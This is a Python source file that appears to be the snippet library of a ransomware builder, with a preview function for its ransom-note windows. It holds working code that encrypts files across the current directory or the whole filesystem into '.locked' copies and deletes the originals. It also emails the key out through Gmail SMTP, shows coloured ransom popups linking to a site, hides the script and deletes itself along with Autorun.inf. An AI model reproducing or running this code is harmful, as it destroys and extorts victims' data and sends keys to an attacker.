class Data:
    def __init__(self):
        self.key_data = """    # Custom Key
    def create_key(self):
        self.key = base64.urlsafe_b64encode(os.urandom(32))
        print("Key: Custom Key Created")

    # secrets Key
    def create_key(self):
        self.key = base64.urlsafe_b64encode(secrets.token_bytes(32))
        print("Key: Secrets Bytes (32) Key Created")

    # Fernet Key
    def create_key(self):
        self.key = Fernet.generate_key()
        print("Key: Fernet Bytes Key Created")"""
        self.encryption_data = """    # fernet_encrypt
    def encrypt_file(self, input_file):
        fernet = Fernet(self.key)
        try:
            with open(input_file, "rb") as file:
                file_data = file.read()
                encrypted_data = fernet.encrypt(file_data)
            with open(input_file + ".locked", "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
            os.remove(input_file)
            print(f"Encrypted: {input_file}")
        except Exception as e:
            print(f"Encrypt ERROR: Failed to encrypt {input_file} because {e}")

    # XOR Encrypt
    def encrypt_file(self, input_file):
        try:
            with open(input_file, "rb") as file:
                data = file.read()
            key_bytes = base64.urlsafe_b64decode(self.key)
            encrypted_data = bytearray(len(data))
            for i in range(len(data)):
                encrypted_data[i] = data[i] ^ key_bytes[i % len(key_bytes)]
            with open(input_file + ".locked", "wb") as output_file:
                output_file.write(encrypted_data)
            os.remove(input_file)
            print(f"Encrypted: {input_file}")
        except Exception as e:
            print(f"Encryption ERROR: Failed to encrypt {input_file} because {e}")"""
        self.decryption_data = """    # Fernet Decrypt
    def decrypt_file(self, encrypted_file_path):
        fernet = Fernet(self.key)
        try:
            with open(encrypted_file_path, "rb") as encrypted_file:
                encrypted_data = encrypted_file.read()
                decrypted_data = fernet.decrypt(encrypted_data)
            with open(encrypted_file_path[:-7], "wb") as decrypted_file:  # remove the ".locked" extension
                decrypted_file.write(decrypted_data)
            os.remove(encrypted_file_path)
            print(f"Decrypted: {encrypted_file_path}")
        except Exception as e:
            print(f"Decrypt ERROR: Failed to decrypt {encrypted_file_path} because {e}")

    # XOR Decrypt
    def decrypt_file(self, input_file):
        try:
            with open(input_file, "rb") as file:
                data = file.read()
            key_bytes = base64.urlsafe_b64decode(self.key)
            decrypted_data = bytearray(len(data))
            for i in range(len(data)):
                decrypted_data[i] = data[i] ^ key_bytes[i % len(key_bytes)]
            with open(input_file[:-7], "wb") as output_file:  # Remove ".locked" from the filename
                output_file.write(decrypted_data)
            os.remove(input_file)
            print(f"Decrypted: {input_file}")
        except Exception as e:
            print(f"Decrypt ERROR: Failed to decrypt {input_file} because {e}")"""
        self.self_destruct = ["""   
    def self_destruct(self):
        try:
            os.remove(os.path.abspath("Autorun.inf"))
            print("Autorun: Autorun.inf Deleted")
        except Exception as e:
            print("Autorun: Autorun.inf Not Present/Found")
        try:
            time.sleep(2)
            print("Main: Main Deleted")
            os.remove(os.path.abspath(sys.argv[0]))
        except Exception as e:
            print(f"Main: Failed to self destruct because {e}.")"""]
        self.storage_method = """    # Key File
    def save_key(self):
        with open("key.key", "wb") as file:
            file.write(self.key)
            print("Key: Saved to key.key")

    # ID File
    def save_key(self):
        with open("ID.id", "w") as file:
            file.write(base64.b64encode(self.key).decode('utf-8'))
            print("Key: ID Key Signature Saved to ID.id")

    # Email Key
    def save_key(self):
        global receiver_email
        global password
        global sender_email
        # Create a multipart message and set headers
        try:
            message = MIMEMultipart()
            message["From"] = sender_email
            message["To"] = receiver_email
            message["Subject"] = "Test Email"
            # Add body to email
            body = f"{self.key}"
            message.attach(MIMEText(body, "plain"))
        except Exception as e:
            print(f"Key: Failed to create Key Message because {e}")
        try:
            # Connect to SMTP server and send email
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()  # Secure the connection
                server.login(sender_email, password)
                server.sendmail(sender_email, receiver_email, message.as_string())
            print("Key: Key Saved through sent Email ")
        except Exception as e:
            print(f"Key: Failed to send Key email from {sender_email} to {receiver_email}. Email:{body}\\nError: {e}")"""
        self.message_data = """# No Message
    def leave_message(self):
        Traces = None
        Find_Me = False
        Fun = True
        Hints = ["You", "Won't", "Get", "Any", " <3 "]
        print("Message: Message Ignored")

    # Text File
    def leave_message(self):
        global instructions
        with open("Instructions.txt", "w") as file:
            file.write(instructions)
        print("Message: Message saved to Instructions.txt")

    # GUI Popup
    def leave_message(self):
        try:
            global instructions
            global popup_type
            root = tk.Tk()
            root.geometry("600x400")
            root.resizable(False, False)
            if popup_type == 1:
                # Setting Colors
                bg = "#ff1919"
                root.configure(bg=bg)
                # Content
                title = tk.Label(root, text=instructions[0], font=("Impact", 30, "bold"), bg=bg) #Helvetica
                title.place(x=1, y=30, anchor="w")
                hr = tk.Frame(root, bd=5, bg="#000000")
                hr.place(x=0, y=55, width=600, height=4)
                text = tk.Label(root, text=instructions[1], font=("Impact", 16), bg=bg, wraplength=600)
                text.place(x=0, y=65, width=600, height=335)
            elif popup_type == 2:
                # Setting Colors
                bg = "#00ff80"
                fg = "#000c42"
                root.configure(bg=bg)
                # Content
                title = tk.Label(root, text=instructions[0], font=("Impact", 25, "bold"), bg=bg, fg=fg) #Helvetica
                title.place(x=1, y=15, width=600)
                hr = tk.Frame(root, bd=5, bg=fg)
                hr.place(x=0, y=55, width=600, height=4)
                content = tk.Frame(root, bg=bg)
                content.place(y=60, x=0, width=600, height=375)
                text1 = tk.Label(content, text=instructions[1], font=("Impact", 16, "bold"), bg=bg, wraplength=600, fg=fg)
                text1.pack(pady=10)
                text2 = tk.Label(content, text=instructions[2], font=("Impact", 16), bg=bg, wraplength=600, fg=fg)
                text2.pack(pady=10)
            elif popup_type == 3:
                def open():
                    try:
                        webbrowser.open(instructions[4])
                    except Exception as e:
                        print(f"Failed to open page {instructions[3]}, because {e}")
                # Setting Colors
                bg = "#05060d"
                fg = "#9de3c2"
                root.configure(bg=bg)
                title = tk.Label(root, text=instructions[0], font=("Impact", 25, "bold"), bg=bg, fg=fg) #Helvetica
                title.place(x=1, y=14, width=600)
                hr = tk.Frame(root, bd=3, bg=fg)
                hr.place(x=0, y=55, width=600, height=3)
                text = tk.Label(root, text=instructions[1], font=("Impact", 19, ), bg=bg, fg=fg, wraplength=600) #Helvetica
                text.pack(pady=60)
                text2 = tk.Label(root, text=instructions[2], font=("Impact", 19), bg=bg, wraplength=600, fg=fg)
                text2.pack(pady=0)
                website = tk.Button(root, text=instructions[3], font=("Impact", 15, "bold"), bg=fg, command=open)
                website.place(width=275, height=50, x=162, y=330)
            elif popup_type == 4:
                def open():
                    try:
                        webbrowser.open(instructions[4])
                    except Exception as e:
                        print(f"Failed to open page {instructions[3]}, because {e}")
                # Setting Colors
                bg = "#ffe0e1"
                fg = "#000000"
                root.configure(bg=bg)
                right_content = tk.Frame(root, bg=bg, highlightbackground=fg, highlightthickness=2)
                right_content.place(x=0, y=0, width=302, height=400)
                title = tk.Label(right_content, text=instructions[0], font=("Impact", 20, "bold"), bg=bg, fg=fg, wraplength=300) #Helvetica
                title.pack(pady=25, padx=5)
                left_content = tk.Frame(root, bg=bg, highlightbackground=fg, highlightthickness=2)
                left_content.place(x=300, y=0, width=300, height=400)
                website_label = tk.Label(right_content, text="Proceed to Site", font=("Impact", 10), bg=bg, fg=fg)
                website_label.place(width=275, height=50, x=12, y=265)
                website = tk.Button(root, text=instructions[3], font=("Impact", 15, "bold"), command=open)
                website.place(width=275, height=50, x=12, y=300)
                text1 = tk.Label(left_content, text=instructions[1], bg=bg, fg=fg, font=("Impact", 13), wraplength=280)
                text1.place(x=10, y=10, width=280, height=190)
                text2 = tk.Label(left_content, text=instructions[2], bg=bg, fg=fg, font=("Impact", 13), wraplength=280)
                text2.place(x=10, y=210, width=280, height=180)
            root.mainloop()
            print("Message: GUI Message Shown")
        except Exception as e:
            print(f"Message: Failed to show GUI Popup because {e}")"""
        self.hide_data = ["""   # Hide File
    def hide_self(self):
        script_path = os.path.realpath(sys.argv[0])
        # Rename the file to start with a dot (for Unix-based systems)
        if not script_path.startswith('.'):
            hidden_script_path = os.path.join(os.path.dirname(script_path), '.' + os.path.basename(script_path))
            os.rename(script_path, hidden_script_path)
            print("Main: Main File Hidden Via Rename")

        # Hide the file on Windows
        if platform.system() == 'Windows':
            try:
                FILE_ATTRIBUTE_HIDDEN = 0x02
                ctypes.windll.kernel32.SetFileAttributesW(__file__, FILE_ATTRIBUTE_HIDDEN)
                print("Main: Main File Attribute Hidden")
            except Exception as e:
                print(f"Main: Windows Attribute Hide Failed because {e}")"""]
        self.files_data = """    # All Below
    def get_files(self):
        current_directory = os.getcwd()
        # Get the files and folders in the current directory
        for entry in os.listdir(current_directory):
            entry_path = os.path.join(current_directory, entry)
            if os.path.isfile(entry_path):
                self.files.append(entry_path)
        # Walk through all subdirectories starting from the current directory
        for root, dirs, files in os.walk(current_directory):
            for file in files:
                # Construct the full path to the file
                file_path = os.path.join(root, file)
                # Append the file path to the list
                if os.path.isfile(file_path) and file_path not in self.files:
                    self.files.append(file_path)
        print("Files: Files Located and Saved")

    # Getting Only all files around
    def get_files(self):
        for file in os.listdir(os.getcwd()):
            if not os.path.isdir(file):
                self.files.append(os.path.abspath(file))
        print("Files: Files Located and Saved")

    # Only Below
    def get_files(self):
        current_directory = os.getcwd()
        for root, dirs, files in os.walk(current_directory):
            if root != current_directory:
                for file in files:
                    # Construct the full path to the file
                    file_path = os.path.join(root, file)
                    # Append the file path to the list
                    self.files.append(file_path)
        print("Files: Files Located and Saved")

    # Everything
    def get_files(self):
        for root, dirs, files in os.walk("/"):
            for file in files:
                try:
                    file_path = os.path.join(root, file)
                    self.files.append(file_path)
                except Exception as e:
                    print(f"Files: Error accessing file: {e}")
        self.files.reverse()
        print("Files: Files Found")"""
        self.all_data = """    # Encrypt All
    def encrypt_files(self):
        encrypter_filename = os.path.basename(sys.argv[0])  # Get the filename of the script
        for file in self.files:
            filename = os.path.basename(file)
            if filename != encrypter_filename and not filename.endswith("Autorun.inf") and not filename.endswith(".locked"):
                self.encrypt_file(file)
        print("Encryption: Complete")

    # Decrypt All
    def decrypt_files(self):
        decrypter_filename = os.path.basename(sys.argv[0])
        for file in self.files:
            filename = os.path.basename(file)
            if filename != decrypter_filename and not filename.endswith("Autorun.inf") and filename.endswith(".locked"):
                self.decrypt_file(file)
        print("Decryption: Complete")"""
        self.get_key_data = """    # Getting key from key.key
    def get_key(self):
        try:
            with open("key.key", "rb") as key_file:
                self.key = key_file.read()
            print("Key: Key obtained from key.key")
            return True
        except Exception as e:
            print(f"Key: Key failed to be obtained from key.key because {e}")
            return False

    # Getting key from ID.id
    def get_key(self):
        try:
            with open("ID.id", "r") as key_file:
                self.key = base64.b64decode(key_file.read())
            print("Key: Key obtained from key.key")
            return True
        except Exception as e:
            print(f"Key: Key failed to be obtained from key.key because {e}")
            return False

    # Input Key
    def get_key(self):
        while True:
            self.key = input("Main: Please input key, type \'info\' for info: ")
            if self.key.lower() == "info":
                print("WARNING: Putting in the WRONG KEY may cause PERMANENT DAMAGE with your files.")
                print("WARNING: The key is CASE SENSITIVE. Make sure you put it in PERFECTLY, or damage may occur.")
                print("WARNING: Do NOT Interrupt the proccess in ANY WAY. Wait for it to FINISH COMPLETELY before changing, fixing, or moving ANYTHING.")
                print("WARNING: Doing ANYTHING WRONG can and will cause damage to files. Be VERY CAREFUL.")
            else:
                return True"""
    def collect_text_data(self, text):
        # Split the text into a list at every empty line
        data_between_empty_lines = text.split("\n\n")
        # Remove leading and trailing whitespace from each element
        data_between_empty_lines = [data.strip() for data in data_between_empty_lines if data.strip()]
        return data_between_empty_lines

    def parse_data(self):
        self.key_data = self.collect_text_data(self.key_data)
        self.encryption_data = self.collect_text_data(self.encryption_data)
        self.storage_method = self.collect_text_data(self.storage_method)
        self.message_data = self.collect_text_data(self.message_data)
        self.decryption_data = self.collect_text_data(self.decryption_data)
        self.files_data = self.collect_text_data(self.files_data)
        self.all_data = self.collect_text_data(self.all_data)
        self.get_key_data = self.collect_text_data(self.get_key_data)

import tkinter as tk
import webbrowser
def test_gui_message(instructions, popup_type, window):
    try:
        popup = tk.Tk(window)
        popup.geometry("600x400")
        popup.resizable(False, False)
        if popup_type == 1:
            # Setting Colors
            bg = "#ff1919"
            popup.configure(bg=bg)
            # Content
            title = tk.Label(popup, text=instructions[0], font=("Impact", 30, "bold"), bg=bg) #Helvetica
            title.place(x=1, y=30, anchor="w")
            hr = tk.Frame(popup, bd=5, bg="#000000")
            hr.place(x=0, y=55, width=600, height=4)
            text = tk.Label(popup, text=instructions[1], font=("Impact", 16), bg=bg, wraplength=600)
            text.place(x=0, y=65, width=600, height=335)
        elif popup_type == 2:
            # Setting Colors
            bg = "#00ff80"
            fg = "#000c42"
            popup.configure(bg=bg)
            # Content
            title = tk.Label(popup, text=instructions[0], font=("Impact", 25, "bold"), bg=bg, fg=fg) #Helvetica
            title.place(x=1, y=15, width=600)
            hr = tk.Frame(popup, bd=5, bg=fg)
            hr.place(x=0, y=55, width=600, height=4)
            content = tk.Frame(popup, bg=bg)
            content.place(y=60, x=0, width=600, height=375)
            text1 = tk.Label(content, text=instructions[1], font=("Impact", 16, "bold"), bg=bg, wraplength=600, fg=fg)
            text1.pack(pady=10)
            text2 = tk.Label(content, text=instructions[2], font=("Impact", 16), bg=bg, wraplength=600, fg=fg)
            text2.pack(pady=10)
        elif popup_type == 3:
            def open():
                try:
                    webbrowser.open(instructions[4])
                except Exception as e:
                    print(f"Message: Failed to open page {instructions[3]}, because {e}")
            # Setting Colors
            bg = "#05060d"
            fg = "#9de3c2"
            popup.configure(bg=bg)
            title = tk.Label(popup, text=instructions[0], font=("Impact", 25, "bold"), bg=bg, fg=fg) #Helvetica
            title.place(x=1, y=14, width=600)
            hr = tk.Frame(popup, bd=3, bg=fg)
            hr.place(x=0, y=55, width=600, height=3)
            text = tk.Label(popup, text=instructions[1], font=("Impact", 19, ), bg=bg, fg=fg, wraplength=600) #Helvetica
            text.pack(pady=60)
            text2 = tk.Label(popup, text=instructions[2], font=("Impact", 19), bg=bg, wraplength=600, fg=fg)
            text2.pack(pady=0)
            website = tk.Button(popup, text=instructions[3], font=("Impact", 15, "bold"), bg=fg, command=open)
            website.place(width=275, height=50, x=162, y=330)
        elif popup_type == 4:
            def open():
                try:
                    webbrowser.open(instructions[4])
                except Exception as e:
                    print(f"Message: Failed to open page {instructions[3]}, because {e}")
            # Setting Colors
            bg = "#ffe0e1"
            fg = "#000000"
            popup.configure(bg=bg)
            right_content = tk.Frame(popup, bg=bg, highlightbackground=fg, highlightthickness=2)
            right_content.place(x=0, y=0, width=302, height=400)
            title = tk.Label(right_content, text=instructions[0], font=("Impact", 20, "bold"), bg=bg, fg=fg, wraplength=300) #Helvetica
            title.pack(pady=25, padx=5)
            left_content = tk.Frame(popup, bg=bg, highlightbackground=fg, highlightthickness=2)
            left_content.place(x=300, y=0, width=300, height=400)
            website_label = tk.Label(right_content, text="Proceed to Site", font=("Impact", 10), bg=bg, fg=fg)
            website_label.place(width=275, height=50, x=12, y=265)
            website = tk.Button(popup, text=instructions[3], font=("Impact", 15, "bold"), command=open)
            website.place(width=275, height=50, x=12, y=300)
            text1 = tk.Label(left_content, text=instructions[1], bg=bg, fg=fg, font=("Impact", 13), wraplength=280)
            text1.place(x=10, y=10, width=280, height=190)
            text2 = tk.Label(left_content, text=instructions[2], bg=bg, fg=fg, font=("Impact", 13), wraplength=280)
            text2.place(x=10, y=210, width=280, height=180)
        popup.mainloop()
    except Exception as e:
        print(f"Message: Failed to show GUI Popup because {e}")